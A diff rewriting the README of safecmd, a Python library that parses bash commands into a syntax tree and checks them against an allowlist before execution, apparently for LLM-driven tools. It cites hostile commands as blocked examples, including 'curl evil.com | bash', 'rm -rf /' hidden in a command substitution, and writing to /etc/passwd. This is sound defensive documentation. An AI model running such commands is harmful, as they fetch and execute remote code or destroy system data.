@@ -5,13 +5,11 @@
 
 ## Introduction
 
-Running shell commands from untrusted sources—like LLM-generated code, user input, or third-party scripts—is risky. A command that looks innocent might contain hidden redirects, command substitutions, or dangerous flags that could modify or delete files, exfiltrate data, or worse.
+safecmd validates bash commands against an allowlist before execution. It is for tools that run commands from LLMs, user input, or third-party scripts. Its default allowlist includes read-only and easily reverted commands that are safe to run.
 
-**safecmd** solves this by validating bash commands against an allowlist before execution. Instead of trying to blacklist dangerous patterns (which is error-prone and easy to bypass), safecmd uses a generous allowlist of read-only and easily-reverted commands that are safe to run.
+A shell command can modify or delete files, send data over the network, or run other commands through substitutions and pipelines. safecmd uses the `shfmt` bash parser to build an abstract syntax tree (AST). It checks commands within pipelines, substitutions, subshells, and heredocs, along with configured output destinations, before execution.
 
-The key innovation is that safecmd uses a proper bash parser (`shfmt`) to build an AST (Abstract Syntax Tree) of your command. This means it correctly handles complex bash syntax—pipelines, command substitutions, subshells, heredocs, and more—extracting and validating every command, even nested ones, before anything executes.
-
-The result: you can safely run commands like `git log | grep "fix"` or `find . -name "*.py" | xargs cat` knowing that if someone tries to sneak in `rm -rf /` or `curl evil.com | bash`, it’ll be blocked before it runs. This makes safecmd ideal for building LLM-powered CLI tools, interactive shells that accept user input, or automation pipelines that process untrusted scripts.
+Commands such as `git log | grep "fix"` and `find . -name "*.py" | xargs cat` pass the default checks. Commands such as `rm -rf /` and `curl evil.com | bash` fail validation. This lets tools run useful shell commands with less worry about accidental damage.
 
 ### Installation
 
@@ -24,12 +22,13 @@ This will automatically install the `shfmt-py` dependency, which provides the `s
 ## Quick Start
 
 ``` python
-from safecmd import safe_run
+from safecmd import safe_run, validate, DisallowedCmd, DisallowedDest
+from fastcore.test import expect_fail
 ```
 
-By default, [`safe_run`](https://AnswerDotAI.github.io/safecmd/core.html#safe_run) allows common read-only commands like `cat`, `grep`, `ls`, `head`, `tail`, `diff`, `wc`, and safe git subcommands (`git log`, `git status`, `git diff`). It also includes gh, npm/yarn, docker, aws, gcloud, and other common tools.
+By default, [`safe_run`](https://AnswerDotAI.github.io/safecmd/core.html#safe_run) allows common read-only commands such as `cat`, `grep`, `ls`, `head`, `tail`, `diff`, and `wc`, along with git subcommands such as `git log`, `git status`, and `git diff`. The allowlist also includes selected commands from gh, npm/yarn, Docker, AWS, GCloud, and other tools. Some allowed commands change state, including package installation and git commits. Review the configuration for your application.
 
-Commands like `find` have **exec flags** configured: `find . -exec ls` passes (since `ls` is allowed) but `find . -exec rm` fails (since `rm` isn’t). Commands like `curl` have **dest flags**: `curl -o /tmp/file` passes but `curl -o /etc/passwd` fails. Output redirects (`>`, `>>`) are allowed but only to the current directory (`./`) or `/tmp`.
+The allowlist can specify arguments that need further checking. For example, `find -exec` takes a command to validate: `find . -exec ls {} \;` passes, while replacing `ls` with `rm` fails. The destination argument to `curl -o` is also checked: `/tmp/file` passes, while `/etc/passwd` fails. The default output destinations are the current directory (`./`), `/tmp`, and `/dev/null`.
 
 Bash command lines that are generally safe run as usual:
 
@@ -37,237 +36,88 @@ Bash command lines that are generally safe run as usual:
 safe_run('ls -la | grep index')
 ```
 
-    '-rw-------@  1 rensdimmendaal  staff  10279 Mar 13 09:28 index.ipynb'
+    '-rw-------   1 jhoward  staff  23153 Sep  6 14:06 index.ipynb\n'
 
-However, any command or op not on the allowed list results in an exception - including in nested commands, pipelines, and so forth:
-
-``` python
-safe_run('echo $(rm -rf /danger)')
-```
-
-    DisallowedCmd: rm -rf /danger
-    [31m---------------------------------------------------------------------------[39m
-    [31mDisallowedCmd[39m                             Traceback (most recent call last)
-    [36mCell[39m[36m [39m[32mIn[22][39m[32m, line 2[39m
-    [32m      1[39m [38;5;66;03m#| eval:false[39;00m
-    [32m----> [39m[32m2[39m [43msafe_run[49m[43m([49m[33;43m'[39;49m[33;43mecho $(rm -rf /danger)[39;49m[33;43m'[39;49m[43m)[49m
-
-    [36mFile [39m[32m~/git/repos/safecmd/safecmd/core.py:291[39m, in [36msafe_run[39m[34m(cmd, cmds, dests, add_cmds, add_dests, rm_cmds, rm_dests, ignore_ex, split)[39m
-    [32m    289[39m [33m"[39m[33mRun `cmd` in shell if all commands and destinations are in allowlists, else raise[39m[33m"[39m
-    [32m    290[39m eff_cmds, eff_dests = _eff_sets(cmds, dests, add_cmds, add_dests, rm_cmds, rm_dests)
-    [32m--> [39m[32m291[39m [43mvalidate[49m[43m([49m[43mcmd[49m[43m,[49m[43m [49m[43meff_cmds[49m[43m,[49m[43m [49m[43meff_dests[49m[43m)[49m
-    [32m    292[39m [38;5;28;01mreturn[39;00m run(cmd, ignore_ex=ignore_ex, split=split)
-
-    [36mFile [39m[32m~/git/repos/safecmd/safecmd/core.py:261[39m, in [36mvalidate[39m[34m(cmd, cmds, dests)[39m
-    [32m    259[39m commands, ops, redirects = extract_commands(cmd, exec_flags=exec_flags, dest_flags=dest_flags, dest_pos=dest_pos, exec_pos=exec_pos)
-    [32m    260[39m [38;5;28;01mfor[39;00m c [38;5;129;01min[39;00m commands:
-    [32m--> [39m[32m261[39m     [38;5;28;01mif[39;00m [38;5;129;01mnot[39;00m validate_cmd(c, cmds): [38;5;28;01mraise[39;00m DisallowedCmd(c)
-    [32m    262[39m [38;5;28;01mfor[39;00m op, dest [38;5;129;01min[39;00m redirects:
-    [32m    263[39m     [38;5;28;01mif[39;00m [38;5;129;01mnot[39;00m validate_dest(dest, dests): [38;5;28;01mraise[39;00m DisallowedDest(dest)
-
-    [31mDisallowedCmd[39m: rm -rf /danger
+[`safe_run`](https://AnswerDotAI.github.io/safecmd/core.html#safe_run) raises [`DisallowedCmd`](https://AnswerDotAI.github.io/safecmd/core.html#disallowedcmd) or [`DisallowedDest`](https://AnswerDotAI.github.io/safecmd/core.html#disalloweddest) when validation fails, including within nested commands and pipelines. Use [`validate`](https://AnswerDotAI.github.io/safecmd/core.html#validate) to check a command without executing it. These examples use `expect_fail` to check the exception type and message without printing a traceback:
 
 ``` python
-safe_run('echo danger > /nonexistent/badpath')
-```
-
-    DisallowedDest: /nonexistent/badpath
-    [31m---------------------------------------------------------------------------[39m
-    [31mDisallowedDest[39m                            Traceback (most recent call last)
-    [36mCell[39m[36m [39m[32mIn[23][39m[32m, line 2[39m
-    [32m      1[39m [38;5;66;03m#| eval:false[39;00m
-    [32m----> [39m[32m2[39m [43msafe_run[49m[43m([49m[33;43m'[39;49m[33;43mecho danger > /nonexistent/badpath[39;49m[33;43m'[39;49m[43m)[49m
-
-    [36mFile [39m[32m~/git/repos/safecmd/safecmd/core.py:291[39m, in [36msafe_run[39m[34m(cmd, cmds, dests, add_cmds, add_dests, rm_cmds, rm_dests, ignore_ex, split)[39m
-    [32m    289[39m [33m"[39m[33mRun `cmd` in shell if all commands and destinations are in allowlists, else raise[39m[33m"[39m
-    [32m    290[39m eff_cmds, eff_dests = _eff_sets(cmds, dests, add_cmds, add_dests, rm_cmds, rm_dests)
-    [32m--> [39m[32m291[39m [43mvalidate[49m[43m([49m[43mcmd[49m[43m,[49m[43m [49m[43meff_cmds[49m[43m,[49m[43m [49m[43meff_dests[49m[43m)[49m
-    [32m    292[39m [38;5;28;01mreturn[39;00m run(cmd, ignore_ex=ignore_ex, split=split)
-
-    [36mFile [39m[32m~/git/repos/safecmd/safecmd/core.py:263[39m, in [36mvalidate[39m[34m(cmd, cmds, dests)[39m
-    [32m    261[39m     [38;5;28;01mif[39;00m [38;5;129;01mnot[39;00m validate_cmd(c, cmds): [38;5;28;01mraise[39;00m DisallowedCmd(c)
-    [32m    262[39m [38;5;28;01mfor[39;00m op, dest [38;5;129;01min[39;00m redirects:
-    [32m--> [39m[32m263[39m     [38;5;28;01mif[39;00m [38;5;129;01mnot[39;00m validate_dest(dest, dests): [38;5;28;01mraise[39;00m DisallowedDest(dest)
-
-    [31mDisallowedDest[39m: /nonexistent/badpath
-
-``` python
-safe_run('sudo ls')
-```
-
-    DisallowedCmd: sudo ls
-    [31m---------------------------------------------------------------------------[39m
-    [31mDisallowedCmd[39m                             Traceback (most recent call last)
-    [36mCell[39m[36m [39m[32mIn[24][39m[32m, line 2[39m
-    [32m      1[39m [38;5;66;03m#| eval:false[39;00m
-    [32m----> [39m[32m2[39m [43msafe_run[49m[43m([49m[33;43m'[39;49m[33;43msudo ls[39;49m[33;43m'[39;49m[43m)[49m
-
-    [36mFile [39m[32m~/git/repos/safecmd/safecmd/core.py:291[39m, in [36msafe_run[39m[34m(cmd, cmds, dests, add_cmds, add_dests, rm_cmds, rm_dests, ignore_ex, split)[39m
-    [32m    289[39m [33m"[39m[33mRun `cmd` in shell if all commands and destinations are in allowlists, else raise[39m[33m"[39m
-    [32m    290[39m eff_cmds, eff_dests = _eff_sets(cmds, dests, add_cmds, add_dests, rm_cmds, rm_dests)
-    [32m--> [39m[32m291[39m [43mvalidate[49m[43m([49m[43mcmd[49m[43m,[49m[43m [49m[43meff_cmds[49m[43m,[49m[43m [49m[43meff_dests[49m[43m)[49m
-    [32m    292[39m [38;5;28;01mreturn[39;00m run(cmd, ignore_ex=ignore_ex, split=split)
-
-    [36mFile [39m[32m~/git/repos/safecmd/safecmd/core.py:261[39m, in [36mvalidate[39m[34m(cmd, cmds, dests)[39m
-    [32m    259[39m commands, ops, redirects = extract_commands(cmd, exec_flags=exec_flags, dest_flags=dest_flags, dest_pos=dest_pos, exec_pos=exec_pos)
-    [32m    260[39m [38;5;28;01mfor[39;00m c [38;5;129;01min[39;00m commands:
-    [32m--> [39m[32m261[39m     [38;5;28;01mif[39;00m [38;5;129;01mnot[39;00m validate_cmd(c, cmds): [38;5;28;01mraise[39;00m DisallowedCmd(c)
-    [32m    262[39m [38;5;28;01mfor[39;00m op, dest [38;5;129;01min[39;00m redirects:
-    [32m    263[39m     [38;5;28;01mif[39;00m [38;5;129;01mnot[39;00m validate_dest(dest, dests): [38;5;28;01mraise[39;00m DisallowedDest(dest)
-
-    [31mDisallowedCmd[39m: sudo ls
-
-To see the current allowlist, check the configuration file stored in `~/.config/safecmd/config.ini` (Linux), `~/Library/Application Support/safecmd/config.ini` (macOS), or `%LOCALAPPDATA%\safecmd\config.ini` (Windows). Edit this file to customize your allowlist permanently, or pass custom values directly to [`safe_run()`](https://AnswerDotAI.github.io/safecmd/core.html#safe_run).
-
-``` python
-from fastcore.xdg import xdg_config_home
+with expect_fail(DisallowedCmd, contains='rm -rf /danger'):
+    validate('echo $(rm -rf /danger)')
 ```
 
 ``` python
-cfg_path = xdg_config_home() / 'safecmd' / 'config.ini'
-print(cfg_path.read_text())
+with expect_fail(DisallowedDest, contains='/nonexistent/badpath'):
+    validate('echo danger > /nonexistent/badpath')
+```
+
+``` python
+with expect_fail(DisallowedCmd, contains='sudo ls'):
+    validate('sudo ls')
+```
+
+The active allowlist is stored in `~/.config/safecmd/config.ini` (Linux), `~/Library/Application Support/safecmd/config.ini` (macOS), or `%LOCALAPPDATA%\safecmd\config.ini` (Windows). `cfg_path` points to this file. Edit it to customize the allowlist permanently, or pass `cmds` and `dests` to [`safe_run()`](https://AnswerDotAI.github.io/safecmd/core.html#safe_run) for an individual call. The `add_cmds`, `rm_cmds`, `add_dests`, and `rm_dests` parameters adjust the configured lists for one call.
+
+`default_cfg` contains the configuration shipped with the package. Its first section lists the default output destinations; your local configuration can differ:
+
+``` python
+from safecmd import default_cfg, cfg_path
+```
+
+``` python
+print(default_cfg.split('\n\n', 1)[0])
 ```
 
     [DEFAULT]
-    ok_dests = ./, /tmp, /Users/jhoward/aai-ws, /Users/jhoward/git, /dev/null
-
-    ok_cmds = cat, head, tail, less, more, bat
-        # Directory listing
-        ls, tree, locate
-        # Search
-        grep, rg, ag, ack, fgrep, egrep, pgrep
-        # Text processing
-        cut, sort, uniq, wc, tr, column, touch
-        # File info
-        file, stat, du, df, which, whereis, type
-        # Comparison
-        diff, cmp, comm
-        # Archives
-        unzip, gunzip, bunzip2, unrar
-        # Network
-        ping, dig, nslookup, host
-        # System info
-        date, cal, uptime, whoami, hostname, uname, printenv
-        # Utilities
-        echo, printf, yes, seq, basename, dirname, realpath, sleep
-        # Git (read-only)
-        git log, git show, git diff, git status,
-        git stash list, git blame, git shortlog, git describe, git rev-parse,
-        git ls-files, git ls-tree, git cat-file, git config --get, git config --list
-        git commit -am
-        # gh
-        gh repo view, gh issue create, gh issue list, gh issue view, gh pr list, gh pr view, gh pr status, gh pr checks, gh pr diff
-        gh release list, gh release view, gh run list, gh run view, gh workflow list, gh workflow view
-        gh auth status, gh gist list, gh gist view, gh browse, gh search
-        # nbdev
-        nbdev-export, nbdev-clean, nbdev-test, nbdev-trust, nbdev-readme
-        # npm (read-only)
-        npm list, npm ls, npm outdated, npm view, npm info, npm why, npm audit, npm config list, npm config get, npm search, npm pack
-        # yarn (read-only)
-        yarn list, yarn outdated, yarn why, yarn info, yarn config list, yarn config get
-        # pnpm (read-only)
-        pnpm list, pnpm ls, pnpm outdated, pnpm why, pnpm config list, pnpm config get
-        # bun (read-only)
-        bun pm ls, bun pm hash
-        # js install
-        npm install, yarn install, pnpm install, bun install
-        # Modern Unix (read-only)
-        bat, eza, exa, fd, fzf, dust, duf, tldr, zoxide, httpie, http, jq, yq
-        # Docker (read-only)
-        docker ps, docker images, docker logs, docker inspect, docker stats, docker top, docker diff, docker history, docker version, docker info
-        # Docker (workspace - reversible)
-        docker pull, docker build
-        # AWS (read-only)
-        aws s3 ls, aws s3 cp, aws sts get-caller-identity, aws iam get-user, aws iam list-users
-        aws ec2 describe-instances, aws ec2 describe-vpcs, aws ec2 describe-security-groups
-        aws logs describe-log-groups, aws logs filter-log-events, aws logs get-log-events
-        aws lambda list-functions, aws lambda get-function
-        aws cloudformation describe-stacks, aws cloudformation list-stacks
-        aws rds describe-db-instances, aws dynamodb list-tables, aws dynamodb describe-table
-        aws sqs list-queues, aws sns list-topics
-        aws configure list, aws configure get
-        # GCloud (read-only)
-        gcloud config list, gcloud config get-value, gcloud auth list
-        gcloud projects list, gcloud projects describe
-        gcloud compute instances list, gcloud compute instances describe, gcloud compute zones list, gcloud compute regions list
-        gcloud container clusters list, gcloud container clusters describe
-        gcloud functions list, gcloud functions describe, gcloud functions logs read
-        gcloud run services list, gcloud run services describe
-        gcloud sql instances list, gcloud sql instances describe
-        gcloud storage ls, gcloud storage cat
-        gcloud logging read
-        # toolslm
-        folder2ctx, repo2ctx
-        # Builtins
-        cd, pwd, export, test, [, true, false
-        # Positional exec/dest handling
-        env:exec=$0, xargs:exec=$0
-        tee:dest=$0, ex:dest=$0, cp:dest=$-1, mv:dest=$-1, mkdir:dest=$-1
-        # Exec/dest flag handling
-        find:-delete|-ok|-okdir:exec=-exec|-execdir
-        rg:--pre
-        tar:--use-compress-program|--transform|--checkpoint-action|--info-script|--new-volume-script:exec=--to-command|-I
-        curl:dest=-o|--output|-O|--remote-name
-        # Extras
-        tools/run_tests.sh
-        # Python testing
-        pytest, chkstyle, maturin develop, maturin build
-        ./build.py
-        cargo run, cargo build, cargo fmt, cargo check, cargo clippy, cargo test
-        pandoc, screencapture
-        fixes
-        claude --bare -p --model sonnet
-        md2html, mdhtml, viewmd
-        quarto render
+    ok_dests = ./, /dev/null, /tmp
 
 ## How It Works
 
-When you call [`safe_run()`](https://AnswerDotAI.github.io/safecmd/core.html#safe_run), safecmd doesn’t just string-match or regex your command—it properly *parses* it. Here’s what happens:
+[`safe_run()`](https://AnswerDotAI.github.io/safecmd/core.html#safe_run) parses and validates the command before passing it to the shell:
 
-**1. Parse the bash command into an AST**
+1.  Parse the bash command into an AST.
 
-safecmd uses [`shfmt`](https://github.com/mvdan/sh), a robust bash parser written in Go, to convert your command string into a JSON Abstract Syntax Tree. This is the same parser used by shell formatters and linters, so it handles all the edge cases that trip up naive approaches: quoted strings, escaped characters, heredocs, nested substitutions, and more.
+    safecmd uses [`shfmt`](https://github.com/mvdan/sh), a bash parser written in Go, to produce a JSON syntax tree. This is the same parser used by shell formatters and linters. The tree represents quoted strings, escaped characters, heredocs, and nested substitutions.
 
-For example, the command `echo "hello" | grep h` becomes a tree structure showing that there’s a pipeline with two commands (`echo` and `grep`), each with their arguments properly identified.
+    For example, `echo "hello" | grep h` becomes a pipeline containing two commands, `echo` and `grep`, with their arguments.
 
-**2. Extract all commands recursively**
+2.  Extract commands recursively.
 
-safecmd walks the AST and extracts every command that would be executed—including commands hidden inside:
-- Pipelines (`cmd1 | cmd2`)
-- Command substitutions (`$(cmd)` or `` `cmd` ``)
-- Subshells (`(cmd)`)
-- Logical chains (`cmd1 && cmd2`, `cmd1 || cmd2`)
+    safecmd walks the tree to find commands within:
 
-This is crucial: a command like `ls $(rm -rf /)` looks like it starts with `ls`, but the nested `rm` would execute first. safecmd catches this because it extracts *all* commands from the AST.
+    - Pipelines (`cmd1 | cmd2`)
+    - Command substitutions (`$(cmd)` or `` `cmd` ``)
+    - Subshells (`(cmd)`)
+    - Logical chains (`cmd1 && cmd2`, `cmd1 || cmd2`)
 
-**3. Validate against the allowlist**
+    In `ls $(rm -rf /)`, the shell would run `rm` before `ls`. safecmd checks both commands and rejects the command line because `rm` is not allowed.
 
-Each extracted command is checked against `ok_cmds` using prefix matching. A simple entry like `'ls'` allows `ls`, `ls -la`, `ls /home`. A multi-word entry like `'git status'` only matches commands starting with those exact words—so `git status` is allowed but `git push` is not.
+3.  Check commands and configured arguments against the allowlists.
 
-Some commands have a **denied flags** list—flags that will cause rejection. For instance, `find` blocks `-delete` which would remove files.
+    Each command must match an entry in `ok_cmds`. Matching uses whole-word prefixes: `ls` allows `ls`, `ls -la`, and `ls /home`; `git status` allows commands starting with those two words, but does not allow `git push`.
 
-Some flags take arguments that themselves need validation:
-- **Exec flags** (like `find -exec`) have a next argument that’s a command—this is parsed and validated recursively. So `find . -exec ls` passes but `find . -exec rm` fails.
-- **Dest flags** (like `curl -o`) have a next argument that’s an output destination—this is validated against `ok_dests`. So `curl -o /tmp/file` passes but `curl -o /etc/passwd` fails.
+    Command entries can also specify:
 
-**4. Validate redirect destinations**
+    - Denied flags, such as `find -delete`, which cause rejection.
+    - Exec flags, such as `find -exec`, whose arguments contain commands to parse and validate recursively.
+    - Dest flags, such as `curl -o`, whose arguments are output destinations to check against `ok_dests`.
 
-Output redirects (`>`, `>>`, `&>`, etc.) are extracted and their destinations validated against `ok_dests`. By default, redirects can only write to the current directory (`./`) or `/tmp`. All paths are resolved to absolute paths before matching, which prevents path traversal attacks like `./..` or `./subdir/../../escape`.
+    For example, `find . -exec ls {} \;` passes, but `find . -exec rm {} \;` fails. For `curl -o`, `/tmp/file` passes the destination check and `/etc/passwd` fails.
 
-**5. Execute if safe**
+4.  Check redirect destinations.
 
-Only after all commands and redirect destinations pass validation does safecmd actually run the command. If anything fails validation, you get a [`DisallowedCmd`](https://AnswerDotAI.github.io/safecmd/core.html#disallowedcmd) or [`DisallowedDest`](https://AnswerDotAI.github.io/safecmd/core.html#disalloweddest) exception—nothing executes.
+    safecmd extracts destinations from output redirects such as `>`, `>>`, and `&>`. It expands `~` and environment variables, converts paths to absolute paths, and normalizes `..` components before comparing them with the prefixes in `ok_dests`. The default prefixes are `./`, `/tmp`, and `/dev/null`.
+
+5.  Execute after validation passes.
+
+    If a command or destination fails validation, safecmd raises [`DisallowedCmd`](https://AnswerDotAI.github.io/safecmd/core.html#disallowedcmd) or [`DisallowedDest`](https://AnswerDotAI.github.io/safecmd/core.html#disalloweddest) without executing the command line. Otherwise, it runs the command and returns its output.
 
 ## When to Use safecmd
 
-safecmd is designed for situations where you need to run shell commands that you don’t fully control. Common use cases include:
+safecmd is useful when an application needs to run shell commands from another source while controlling which commands it accepts:
 
-**LLM-powered tools**: If you’re building an AI assistant that can run shell commands (like solveit itself), safecmd lets you execute LLM-generated commands without worrying that a hallucination or prompt injection will cause damage.
+- LLM-powered tools such as solveit can execute generated commands with less worry about accidental damage from hallucinations or prompt injection.
+- Interactive CLIs can accept shell commands from users and reject commands outside the configured allowlist.
+- Automation pipelines can check commands supplied through configuration files, APIs, or webhooks before execution.
+- Sandboxed environments can use safecmd to apply command-level restrictions alongside isolation.
 
-**Interactive CLIs**: Building a tool where users type shell commands? safecmd lets you offer shell functionality while preventing users (or attackers) from running dangerous commands.
-
-**Automation pipelines**: Processing scripts or commands from external sources—config files, APIs, webhooks—where you want to allow some shell operations but not arbitrary code execution.
-
-**Sandboxed environments**: When you want to give users shell access but restrict what they can do, safecmd provides a lightweight alternative to containerization for command-level restrictions.
-
-safecmd is *not* a replacement for proper sandboxing if you’re running completely untrusted code. It’s best suited for scenarios where you want to allow a known set of useful commands while blocking obviously dangerous ones. It does not provide protection from an adversary proactively trying to break in, and does not provide any guarantees.
+safecmd allows a known set of useful commands while blocking obviously dangerous ones. It is not a replacement for sandboxing completely untrusted code. It does not protect against an adversary trying to bypass the checks and provides no safety guarantees.
